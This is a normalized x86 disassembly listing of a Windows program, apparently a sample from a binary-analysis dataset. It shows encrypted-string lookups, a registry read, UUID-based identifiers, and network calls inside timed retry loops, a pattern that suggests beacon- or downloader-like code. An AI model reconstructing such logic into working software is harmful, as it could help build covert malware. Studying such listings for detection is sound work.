xor ecx ecx
mov eax r--data
mov [ esp + 0x3c ] esi
cmp ecx eax
je r-xdata
xor bl bl
mov [ esp + 0x1c ] esi
mov [ esp + 0x17 ] 0x0
mov [ esp + 0x38 ] 0x40920001
push 0x4
lea ecx [ esp + 0x40 ]
push ecx
push 0x4
push r--data
push eax
push 0x80000001
call sub_40697b
mov esi [ esp + 0x24 ]
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x38 ]
mov esi ebx
mov [ esp + 0x14 ] 0x6bb8ddd8
call sub_4015ac
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x2c ]
mov [ esp + 0x14 ] 0x124a76f5
call sub_4015ac
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x24 ]
mov [ esp + 0x14 ] 0x15289533
call sub_4015ac
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x30 ]
mov [ esp + 0x14 ] 0x623397cf
call sub_4015ac
lea eax [ esp + 0x10 ]
push eax
lea esi [ esp + 0x34 ]
mov ecx ebx
mov [ esp + 0x14 ] 0x7f4becad
call sub_40157f
lea eax [ esp + 0x10 ]
push eax
lea esi [ esp + 0x28 ]
mov ecx ebx
mov [ esp + 0x14 ] 0x69b8e0a0
call sub_40157f
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x1c ]
mov esi ebx
mov [ esp + 0x14 ] 0x61a0c61a
call sub_4015ac
mov esi [ lstrcpyW@IAT ]
lea eax [ esp + 0x50 ]
push eax
lea eax [ esp + 0x134 ]
push eax
call esi
push [ esp + 0x18 ]
mov ebx [ lstrcatW@IAT ]
lea eax [ esp + 0x134 ]
push eax
call ebx
push 0x80051a85
lea eax [ esp + 0xb4 ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea eax [ esp + 0xb0 ]
push eax
lea eax [ esp + 0x134 ]
push eax
call ebx
lea eax [ esp + 0x130 ]
push eax
lea eax [ esp + 0x234 ]
push eax
call esi
lea eax [ esp + 0x10 ]
push eax
lea esi [ esp + 0x6c ]
mov [ esp + 0x14 ] 0x11bfc7eb
call sub_4015ac
push [ esp + 0x18 ]
lea eax [ esp + 0x134 ]
push eax
call ebx
push [ ebp + 0x8 ]
call sub_4054a4
push eax
push edx
push r--data
lea eax [ esp + 0xbc ]
push eax
call [ wsprintfW@IAT ]
add esp 0x10
lea eax [ esp + 0xb0 ]
push eax
lea eax [ esp + 0x234 ]
push eax
call ebx
push [ esp + 0x18 ]
lea eax [ esp + 0x234 ]
push eax
call ebx
push r--data
lea eax [ esp + 0x334 ]
push eax
call [ lstrcpyW@IAT ]
push [ esp + 0x34 ]
lea eax [ esp + 0x334 ]
push eax
call ebx
mov esi [ esp + 0x2c ]
cmp [ esi ] 0x2f
je r-xdata
mov [ esp + 0x544 ] 0x0
lea eax [ esp + 0x68 ]
push eax
call sub_40114f
or [ esp + 0x544 ] 0xffffffff
lea esi [ esp + 0x40 ]
call sub_405f2c
mov ecx [ esp + 0x53c ]
pop edi
pop esi
mov al bl
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
push esi
lea eax [ esp + 0x334 ]
push eax
call ebx
push [ esp + 0x20 ]
lea eax [ esp + 0x334 ]
push [ esp + 0x2c ]
lea edi [ esp + 0x58 ]
push eax
xor esi esi
call sub_40bac2
add esp 0xc
test al al
jne r-xdata
push rw-data
lea eax [ esp + 0x334 ]
push eax
call ebx
mov eax [ esp + 0x50 ]
mov [ esp + 0x130 ] ax
mov [ esp + 0x230 ] ax
lea eax [ esp + 0x40 ]
push eax
lea eax [ esp + 0x234 ]
push eax
mov [ esp + 0x1f ] 0x1
call sub_40bb48
mov eax [ esp + 0x4c ]
pop ecx
pop ecx
mov esi eax
test eax eax
jne r-xdata
mov ebx [ esp + 0x30 ]
imul ebx ebx 0x3e8
jle r-xdata
lea eax [ esp + 0x40 ]
push eax
lea eax [ esp + 0x134 ]
push eax
call sub_40bb48
mov eax [ esp + 0x4c ]
pop ecx
pop ecx
mov esi eax
test eax eax
inc [ esp + 0x1c ]
mov eax [ esp + 0x1c ]
mov [ esp + 0x10 ] eax
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x3c ]
push eax
lea eax [ esp + 0x94 ]
push eax
push ecx
call sub_40729d
pop ecx
push eax
call sub_407203
mov [ esp + 0x544 ] 0x2
push eax
lea ebx [ esp + 0x6c ]
call sub_40b695
mov [ esp + 0x544 ] 0x1
lea eax [ esp + 0x8c ]
push eax
call sub_40114f
mov eax [ esp + 0x70 ]
push 0xd
xor edx edx
pop ecx
div ecx
test eax eax
je r-xdata
push [ esp + 0x20 ]
lea eax [ esp + 0x334 ]
push [ esp + 0x2c ]
lea edi [ esp + 0x58 ]
push eax
call sub_40bac2
add esp 0xc
test al al
je r-xdata
push 0x1
lea eax [ esp + 0x54 ]
push eax
call [ WNetCancelConnectionW@IAT ]
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push ebx
call [ Sleep@IAT ]
inc esi
cmp esi [ esp + 0x24 ]
jge r-xdata
mov eax [ ebp + 0x10 ]
mov bl [ esp + 0x17 ]
mov [ eax ] esi
jmp r-xdata
xor esi esi
mov ecx [ ebp + 0x10 ]
cmp eax [ ecx ]
jge r-xdata
push eax
push [ esp + 0x44 ]
push [ ebp + 0xc ]
call sub_413290
add esp 0xc
jmp r-xdata
sub_40bfc5
push ebp
mov ebp esp
sub esp 0xfb8
push esi
push edi
xor edi edi
push edi
push edi
push edi
xor esi esi
inc esi
push esi
push r--data
call [ rw-data ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] esi
cmp eax edi
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] edi
pop edi
sete al
pop esi
leave
retn
push ebx
push esi
push 0x8000000
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push eax
call [ rw-data ]
mov ebx eax
cmp ebx edi
je r-xdata
push [ ebp - 0x14 ]
call [ rw-data ]
pop ebx
push [ ebp + 0x24 ]
push ebx
call [ rw-data ]
push 0x2
push 0x2
push 0x40000000
push [ ebp + 0x10 ]
push ebx
call [ rw-data ]
mov [ ebp - 0xc ] eax
cmp eax edi
je r-xdata
push ebx
call [ rw-data ]
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov esi 0x2000
lea ecx [ ebp - 0x10 ]
push ecx
push eax
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
call [ rw-data ]
test eax eax
mov eax [ ebp - 0x10 ]
je r-xdata
mov eax esi
cmp eax edi
jne r-xdata
add [ ebp - 0x8 ] eax
sub [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] edi
ja r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
push edi
mov [ ebp - 0x10 ] edi
call [ SetLastError@IAT ]
mov eax [ ebp - 0x4 ]
cmp eax esi
jb r-xdata
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xfb8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov [ ebp - 0x8 ] 0xfa0
call [ InternetGetLastResponseInfoW@IAT ]
push 0x64
call [ Sleep@IAT ]
push [ ebp - 0xc ]
call [ rw-data ]
sub_40c0e0
push ebx
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
mov al 0x1
push r--data
call sub_4046cc
mov ebx r--data
mov ecx eax
call sub_4010c5
push r--data
mov [ rw-data ] eax
call sub_4046cc
mov ecx eax
call sub_4010c5
push r--data
mov [ rw-data ] eax
call sub_4046cc
mov ecx eax
call sub_4010c5
push r--data
mov [ rw-data ] eax
call sub_4046cc
mov ecx eax
call sub_4010c5
push r--data
mov [ rw-data ] eax
call sub_4046cc
mov ecx eax
call sub_4010c5
push r--data
mov [ rw-data ] eax
call sub_4046cc
mov ecx eax
call sub_4010c5
push r--data
mov [ rw-data ] eax
call sub_4046cc
mov ecx eax
call sub_4010c5
mov [ rw-data ] eax
cmp [ rw-data ] esi
je r-xdata
xor al al
jmp r-xdata
cmp [ rw-data ] esi
je r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] esi
je r-xdata
cmp [ rw-data ] esi
je r-xdata
cmp [ rw-data ] esi
je r-xdata
cmp [ rw-data ] esi
je r-xdata
cmp eax esi
je r-xdata
inc [ rw-data ]
sub_40c1d2
push ebp
mov ebp esp
sub esp 0x238
and [ ebp - 0xc ] 0x0
push ebx
push esi
push edi
mov esi eax
lea eax [ ebp - 0x8 ]
push eax
lea edi [ ebp - 0xc ]
mov [ ebp - 0x8 ] 0x61a0c61a
call sub_4015ac
push 0x0
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
call sub_406135
call sub_4046cc
push 0x8
pop ecx
mov edx eax
push 0xffffffff
xor eax eax
lea edi [ ebp - 0x34 ]
push edx
lea ebx [ ebp - 0x34 ]
[ edi ]
call sub_40394f
mov [ ebp - 0x8 ] eax
call sub_4046cc
push 0x8
pop ecx
mov edx eax
push 0xa
xor eax eax
lea edi [ ebp - 0x34 ]
push edx
lea ebx [ ebp - 0x34 ]
[ edi ]
call sub_40394f
push eax
call [ Sleep@IAT ]
call sub_4046cc
push 0x8
pop ecx
mov edx eax
push 0xffffffff
xor eax eax
lea edi [ ebp - 0x34 ]
push edx
lea ebx [ ebp - 0x34 ]
[ edi ]
call sub_40394f
mov edi eax
call sub_4046cc
push eax
call sub_4054a4
inc [ rw-data ]
mov ebx eax
mov [ ebp - 0x10 ] edx
call sub_4046cc
push edi
push [ ebp - 0x8 ]
lea eax [ ebp - 0x234 ]
push [ rw-data ]
push ebx
push [ ebp - 0x10 ]
push 0x80051a85
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0x20
push 0x0
lea eax [ ebp - 0x234 ]
push eax
push [ ebp + 0x8 ]
call sub_406135
lea eax [ ebp - 0x8 ]
push eax
lea edi [ ebp - 0xc ]
mov [ ebp - 0x8 ] 0x11bfc7eb
call sub_4015ac
push 0x1
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
call sub_406135
pop edi
pop esi
pop ebx
leave
retn
sub_40c2dd
push ebp
mov ebp esp
sub esp 0x28
xor eax eax
push esi
push edi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x1 ] al
lea eax [ ebp - 0x1c ]
push eax
lea edi [ ebp - 0x18 ]
mov esi ebx
mov [ ebp - 0x1c ] 0x6bb8ddd8
call sub_4015ac
lea eax [ ebp - 0x1c ]
push eax
lea esi [ ebp - 0x20 ]
mov ecx ebx
mov [ ebp - 0x1c ] 0x11d0f59c
call sub_40157f
lea eax [ ebp - 0x1c ]
push eax
lea edi [ ebp - 0x14 ]
mov esi ebx
mov [ ebp - 0x1c ] 0x124a76f5
call sub_4015ac
lea eax [ ebp - 0x1c ]
push eax
lea edi [ ebp - 0x10 ]
mov [ ebp - 0x1c ] 0x15289533
call sub_4015ac
lea eax [ ebp - 0x1c ]
push eax
lea edi [ ebp - 0xc ]
mov [ ebp - 0x1c ] 0x62358130
call sub_4015ac
lea eax [ ebp - 0x1c ]
push eax
lea esi [ ebp - 0x24 ]
mov ecx ebx
mov [ ebp - 0x1c ] 0x7f4becad
call sub_40157f
lea eax [ ebp - 0x1c ]
push eax
lea esi [ ebp - 0x28 ]
mov ecx ebx
mov [ ebp - 0x1c ] 0x69b8e0a0
call sub_40157f
pop edi
pop esi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp - 0x24 ]
imul eax eax 0x3e8
push eax
call [ Sleep@IAT ]
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x28 ]
jb r-xdata
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
push [ ebp - 0x14 ]
push [ ebp - 0x20 ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_40bfc5
add esp 0x20
test al al
jne r-xdata
jmp r-xdata
mov al [ ebp - 0x1 ]
leave
retn
sub_40c3d4
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41db36
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x64
push ebx
push esi
lea esi [ esp + 0x10 ]
call sub_405d11
xor esi esi
mov [ esp + 0x74 ] esi
lea eax [ esp + 0x20 ]
push eax
xor bl bl
call sub_401108
mov [ esp + 0x74 ] 0x1
call sub_40c0e0
test al al
je r-xdata
mov [ esp + 0x74 ] 0x0
lea eax [ esp + 0x20 ]
push eax
call sub_40114f
or [ esp + 0x74 ] 0xffffffff
lea esi [ esp + 0x10 ]
call sub_405f2c
mov ecx [ esp + 0x6c ]
pop esi
mov al bl
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov [ esp + 0xc ] 0x30383201
xor bl bl
lea eax [ esp + 0x10 ]
push eax
mov eax ebx
call sub_40c1d2
pop ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ esp + 0x18 ]
call sub_40c2dd
mov bl al
add esp 0xc
test bl bl
je r-xdata
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x4c ]
push eax
inc esi
push ecx
mov [ esp + 0x18 ] esi
call sub_40729d
pop ecx
push eax
call sub_407203
mov [ esp + 0x74 ] 0x2
push eax
lea ebx [ esp + 0x24 ]
call sub_40b695
mov [ esp + 0x74 ] 0x1
lea eax [ esp + 0x44 ]
push eax
call sub_40114f
mov eax [ esp + 0x28 ]
push 0xd
xor edx edx
pop ecx
div ecx
test eax eax
je r-xdata
jmp r-xdata
sub_40c4cc
push ebp
mov ebp esp
sub esp 0x5c
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
xor edi edi
push edi
push edi
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edi
push edi
mov [ ebp - 0x1 ] 0x0
call [ rw-data ]
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
cmp ecx edi
je r-xdata
push 0x48
pop edx
lea eax [ ebp - 0x58 ]
mov [ eax ] 0x0
inc eax
dec edx
jne r-xdata
mov eax [ ecx ]
push edi
lea edx [ ebp - 0x58 ]
push edx
push ecx
call [ eax + 0x30 ]
cmp [ ebp - 0x50 ] 0x3
jbe r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov ebx 0x800
cmp [ ebp - 0x50 ] ebx
jae r-xdata
mov [ ebp - 0xc ] edi
cmp [ esi + 0x4 ] ebx
jae r-xdata
mov ebx [ ebp - 0x50 ]
test ebx ebx
test ebx ebx
jle r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
je r-xdata
push 0x1
push ebx
call sub_405f9d
mov eax [ esi ]
mov ecx [ ebp - 0x8 ]
mov edx [ ecx ]
lea esi [ ebp - 0xc ]
push esi
mov esi ebx
sub esi edi
push esi
add eax edi
push eax
push ecx
call [ edx + 0xc ]
test eax eax
jne r-xdata
cmp eax 0x1
jne r-xdata
add edi [ ebp - 0xc ]
jmp r-xdata
cmp eax 0x8000000a
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
mov esi [ ebp + 0xc ]
sub_40c59b
push ebp
mov ebp esp
sub esp 0x84
push ebx
push esi
push edi
mov esi eax
call sub_405f3e
xor ebx ebx
push ebx
push [ ebp + 0x8 ]
push esi
call sub_406135
push ebx
push r--data
push esi
call sub_406135
call sub_4046cc
mov edi [ wsprintfW@IAT ]
push 0x80051a85
lea eax [ ebp - 0x80 ]
push r--data
push eax
call edi
add esp 0xc
push ebx
push r--data
push esi
call sub_406135
push ebx
lea eax [ ebp - 0x80 ]
push eax
push esi
call sub_406135
call sub_4046cc
push eax
call sub_4054a4
push eax
push edx
lea eax [ ebp - 0x80 ]
push r--data
push eax
call edi
add esp 0x10
push ebx
push r--data
push esi
call sub_406135
push ebx
lea eax [ ebp - 0x80 ]
push eax
push esi
call sub_406135
push [ ebp + 0xc ]
lea eax [ ebp - 0x80 ]
push r--data
push eax
call edi
add esp 0xc
push ebx
push r--data
push esi
call sub_406135
push ebx
lea eax [ ebp - 0x80 ]
push eax
push esi
call sub_406135
mov eax [ ebp + 0x8 ]
add eax 0x208
push eax
lea eax [ ebp - 0x80 ]
push r--data
push eax
call edi
add esp 0xc
push ebx
push r--data
push esi
call sub_406135
push ebx
lea eax [ ebp - 0x80 ]
push eax
push esi
call sub_406135
mov eax [ ebp + 0x8 ]
push [ eax + 0x290 ]
lea eax [ ebp - 0x80 ]
push r--data
push eax
call edi
add esp 0xc
push ebx
push r--data
push esi
call sub_406135
push ebx
lea eax [ ebp - 0x80 ]
push eax
push esi
call sub_406135
mov eax [ ebp + 0x8 ]
push [ eax + 0x28c ]
lea eax [ ebp - 0x80 ]
push r--data
push eax
call edi
add esp 0xc
push ebx
push r--data
push esi
call sub_406135
push ebx
lea eax [ ebp - 0x80 ]
push eax
push esi
call sub_406135
cmp [ ebp + 0xc ] 0x2
je r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
leave
retn
mov eax [ ebp + 0x8 ]
push [ eax + 0x294 ]
lea eax [ ebp - 0x80 ]
push r--data
push eax
call edi
add esp 0xc
push ebx
push r--data
push esi
call sub_406135
push ebx
lea eax [ ebp - 0x80 ]
push eax
push esi
call sub_406135
sub_40c71a
mov eax sub_41db10
call sub_4198ec
sub esp 0x244
push ebx
push esi
push edi
lea esi [ ebp - 0x34 ]
call sub_405d11
and [ ebp - 0x4 ] 0x0
lea esi [ ebp - 0x44 ]
call sub_405d11
mov [ ebp - 0x4 ] 0x1
push 0x100
call sub_4046cc
push eax
lea esi [ ebp - 0x250 ]
call sub_4039ef
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x50 ] ax
push 0x1
push esi
lea eax [ ebp - 0x34 ]
call sub_40c59b
and [ esi + 0x288 ] 0x0
mov ebx [ lstrlenW@IAT ]
pop ecx
pop ecx
mov [ ebp - 0x14 ] 0x8
mov edi r--data
xor eax eax
mov esi r--data
cmp eax esi
je r-xdata
push edi
call ebx
push 0x0
add eax eax
push edi
mov ecx esi
call sub_4060be
mov esi [ ebp - 0x14 ]
test esi esi
jle r-xdata
push esi
call ebx
push 0x0
add eax eax
push esi
lea ecx [ ebp - 0x24 ]
call sub_4060be
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x24 ]
call sub_40c4cc
pop ecx
pop ecx
mov [ ebp - 0xd ] al
test al al
jne r-xdata
lea eax [ ebp - 0x250 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x40 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x288 ] eax
mov [ ebp - 0x4 ] 0x1
lea esi [ ebp - 0x24 ]
call sub_405f2c
mov [ ebp - 0x4 ] 0x1
lea esi [ ebp - 0x24 ]
call sub_405f2c
dec [ ebp - 0x14 ]
cmp [ ebp - 0x14 ] 0x0
jg r-xdata
dec esi
jne r-xdata
push eax
call ebx
push 0x0
lea ecx [ ebp - 0x250 ]
push ecx
add eax eax
lea ecx [ ebp - 0x24 ]
call sub_4060be
lea esi [ ebp - 0x24 ]
call sub_405d11
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0x30 ]
push 0x0
push [ ebp - 0x34 ]
mov ecx esi
call sub_4060be
xor eax eax
cmp eax edi
je r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
lea esi [ ebp - 0x44 ]
call sub_405f2c
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x34 ]
call sub_405f2c
mov ecx [ ebp - 0xc ]
mov al [ ebp - 0xd ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
sub_40c871
mov eax sub_41daee
call sub_4198ec
sub esp 0x24
push ebx
xor ebx ebx
push esi
cmp [ edi + 0x29c ] ebx
je r-xdata
xor al al
cmp [ edi + 0x298 ] ebx
jle r-xdata
lea esi [ ebp - 0x30 ]
call sub_405d11
mov [ ebp - 0x4 ] ebx
push 0x2
push edi
mov eax esi
call sub_40c59b
pop ecx
pop ecx
lea esi [ ebp - 0x20 ]
call sub_405d11
mov [ ebp - 0x4 ] 0x1
mov eax esi
push eax
push [ ebp - 0x30 ]
call sub_40c4cc
mov bl al
pop ecx
pop ecx
test bl bl
je r-xdata
mov [ ebp - 0x4 ] 0x0
lea esi [ ebp - 0x20 ]
call sub_405f2c
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x30 ]
call sub_405f2c
mov al bl
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov [ edi + 0x294 ] eax
cmp eax 0xffffffff
je r-xdata
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
cmp eax [ edi + 0x290 ]
jle r-xdata
xor bl bl
sub_40c90e
mov eax sub_41dad4
call sub_4198ec
mov eax 0x1834
call sub_419050
push ebx
push esi
lea esi [ ebp - 0x20 ]
call sub_405d11
xor ebx ebx
mov [ ebp - 0x4 ] ebx
lea esi [ ebp - 0x30 ]
call sub_405d11
mov [ ebp - 0x4 ] 0x1
cmp [ edi + 0x29c ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0x0
lea esi [ ebp - 0x30 ]
call sub_405f2c
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x20 ]
call sub_405f2c
xor al al
cmp [ edi + 0x298 ] ebx
jle r-xdata
push 0x3
push edi
lea eax [ ebp - 0x20 ]
call sub_40c59b
mov ebx [ lstrlenW@IAT ]
xor eax eax
mov esi r--data
pop ecx
pop ecx
cmp eax esi
je r-xdata
xor eax eax
mov esi r--data
cmp eax esi
je r-xdata
push esi
call ebx
push 0x0
add eax eax
push esi
lea ecx [ ebp - 0x20 ]
call sub_4060be
mov ecx 0x800
lea eax [ ebp - 0x834 ]
push esi
call ebx
push 0x0
add eax eax
push esi
lea ecx [ ebp - 0x20 ]
call sub_4060be
mov [ eax ] 0x0
inc eax
dec ecx
jne r-xdata
mov eax [ edi + 0x28c ]
mov edx [ edi + 0x294 ]
mov ecx [ edi + 0x298 ]
imul edx eax
sub ecx edx
mov esi eax
cmp eax ecx
jl r-xdata
call sub_4046cc
mov edx [ edi + 0x28c ]
imul edx [ edi + 0x294 ]
add edx [ edi + 0x29c ]
lea ecx [ ebp - 0x834 ]
mov eax esi
call sub_4015e7
push 0x801
lea eax [ ebp - 0x183c ]
push eax
push 0xffffffff
lea eax [ ebp - 0x834 ]
push eax
push 0x8
push 0x0
call [ MultiByteToWideChar@IAT ]
test eax eax
jle r-xdata
mov esi ecx
call [ GetLastError@IAT ]
cmp eax 0x459
je r-xdata
lea eax [ ebp - 0x183c ]
test eax eax
je r-xdata
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x20 ]
call sub_40c4cc
mov bl al
pop ecx
pop ecx
test bl bl
je r-xdata
push eax
call ebx
push 0x0
lea ecx [ ebp - 0x183c ]
push ecx
add eax eax
lea ecx [ ebp - 0x20 ]
call sub_4060be
mov [ ebp - 0x4 ] 0x0
lea esi [ ebp - 0x30 ]
call sub_405f2c
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x20 ]
call sub_405f2c
mov al bl
jmp r-xdata
mov eax [ ebp - 0x30 ]
mov eax [ eax ]
mov [ edi + 0x294 ] eax
cmp eax 0xffffffff
je r-xdata
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
cmp eax [ edi + 0x290 ]
jle r-xdata
xor bl bl
sub_40cab6
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41dcfe
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x358
push ebx
push esi
push edi
lea eax [ esp + 0x38 ]
push eax
call sub_401108
and [ esp + 0x36c ] 0x0
cmp [ rw-data ] 0x0
jne r-xdata
and [ esp + 0x10 ] 0x0
mov [ esp + 0x28 ] 0x30177102
push r--data
call sub_4046cc
mov ebx r--data
mov ecx eax
call sub_4010c5
mov [ rw-data ] eax
test eax eax
jne r-xdata
or [ esp + 0x36c ] 0xffffffff
lea eax [ esp + 0x38 ]
push eax
call sub_40114f
xor al al
jmp r-xdata
lea eax [ esp + 0xc ]
push eax
lea edi [ esp + 0x38 ]
mov esi ebx
mov [ esp + 0x10 ] 0x6bb8ddd8
call sub_4015ac
lea eax [ esp + 0xc ]
push eax
lea edi [ esp + 0x34 ]
mov [ esp + 0x10 ] 0x61300451
call sub_4015ac
lea eax [ esp + 0xc ]
push eax
lea esi [ esp + 0x30 ]
mov ecx ebx
mov [ esp + 0x10 ] 0x7f4becad
call sub_40157f
lea eax [ esp + 0xc ]
push eax
lea esi [ esp + 0x28 ]
mov ecx ebx
mov [ esp + 0x10 ] 0x69b8e0a0
call sub_40157f
push r--data
lea eax [ esp + 0xc4 ]
push eax
call [ lstrcpyW@IAT ]
push [ esp + 0x34 ]
mov esi [ lstrcatW@IAT ]
lea eax [ esp + 0xc4 ]
push eax
call esi
mov edi [ esp + 0x30 ]
cmp [ edi ] 0x2f
je r-xdata
inc [ rw-data ]
mov ecx [ esp + 0x364 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
push edi
lea eax [ esp + 0xc4 ]
push eax
call esi
lea eax [ esp + 0x14 ]
push eax
call [ UuidCreate@IAT ]
xor eax eax
mov [ esp + 0x2c8 ] ax
movzx eax [ esp + 0x23 ]
push eax
movzx eax [ esp + 0x26 ]
push eax
movzx eax [ esp + 0x29 ]
push eax
movzx eax [ esp + 0x2c ]
push eax
movzx eax [ esp + 0x2f ]
push eax
movzx eax [ esp + 0x32 ]
push eax
movzx eax [ esp + 0x35 ]
push eax
movzx eax [ esp + 0x38 ]
push eax
movzx eax [ esp + 0x3a ]
push eax
movzx eax [ esp + 0x3c ]
push eax
push [ esp + 0x3c ]
lea eax [ esp + 0x2f4 ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0x34
push 0x8
pop ecx
push 0x64
push [ ebp + 0x8 ]
xor eax eax
lea edi [ esp + 0x64 ]
lea ebx [ esp + 0x64 ]
[ edi ]
call sub_40394f
push 0x8
pop ecx
push 0x400
push [ ebp + 0x8 ]
mov [ esp + 0x358 ] eax
xor eax eax
lea edi [ esp + 0x84 ]
lea ebx [ esp + 0x84 ]
[ edi ]
call sub_40394f
mov [ esp + 0x34c ] eax
lea eax [ esp + 0xc0 ]
push eax
call sub_40c71a
pop ecx
test al al
je r-xdata
push r--data
lea eax [ esp + 0xc4 ]
push eax
call esi
inc [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0xc ] eax
lea eax [ esp + 0xc ]
push eax
lea eax [ esp + 0x2c ]
push eax
lea eax [ esp + 0xa4 ]
push eax
push ecx
call sub_40729d
pop ecx
push eax
call sub_407203
mov [ esp + 0x36c ] 0x1
push eax
lea ebx [ esp + 0x3c ]
call sub_40b695
mov [ esp + 0x36c ] 0x0
lea eax [ esp + 0x9c ]
push eax
call sub_40114f
mov eax [ esp + 0x40 ]
push 0xd
xor edx edx
pop ecx
div ecx
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
mov [ esp + 0x35c ] eax
mov eax [ esp + 0x348 ]
imul eax eax 0x3
cdq
and edx 0x3
add eax edx
sar eax 0x2
cdq
push 0x64
pop ecx
idiv ecx
mov esi [ ebp + 0x10 ]
mov [ esp + 0x358 ] esi
mov ecx eax
imul ecx ecx 0x64
mov eax esi
cdq
idiv ecx
mov [ esp + 0x34c ] ecx
mov edx eax
imul edx ecx
cmp edx esi
je r-xdata
and [ esp + 0x354 ] 0x0
lea edi [ esp + 0xc0 ]
mov [ esp + 0x350 ] eax
call sub_40c871
test al al
je r-xdata
inc eax
xor ebx ebx
cmp [ esp + 0x354 ] 0xffffffff
je r-xdata
or [ esp + 0x36c ] 0xffffffff
lea eax [ esp + 0x38 ]
push eax
call sub_40114f
mov al 0x1
mov esi [ Sleep@IAT ]
push 0x32
call esi
lea edi [ esp + 0xc0 ]
call sub_40c90e
test al al
jne r-xdata
cmp [ esp + 0x354 ] 0xffffffff
jne r-xdata
mov eax [ esp + 0x2c ]
imul eax eax 0x3e8
push eax
call esi
inc ebx
cmp ebx [ esp + 0x24 ]
jge r-xdata
cmp [ esp + 0x354 ] 0xffffffff
jne r-xdata
sub_40cdfe
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41daba
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x910
push ebx
push esi
push edi
lea eax [ esp + 0x38 ]
push eax
call sub_401108
xor ebx ebx
mov [ esp + 0x924 ] ebx
push r--data
call sub_402b4f
cmp al bl
jne r-xdata
mov [ esp + 0x1c ] ebx
mov [ esp + 0x17 ] bl
mov [ esp + 0x28 ] 0x30290001
or [ esp + 0x924 ] 0xffffffff
lea eax [ esp + 0x38 ]
push eax
call sub_40114f
mov ecx [ esp + 0x91c ]
pop edi
pop esi
mov al bl
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov bl [ esp + 0x17 ]
jmp r-xdata
lea eax [ esp + 0x10 ]
push eax
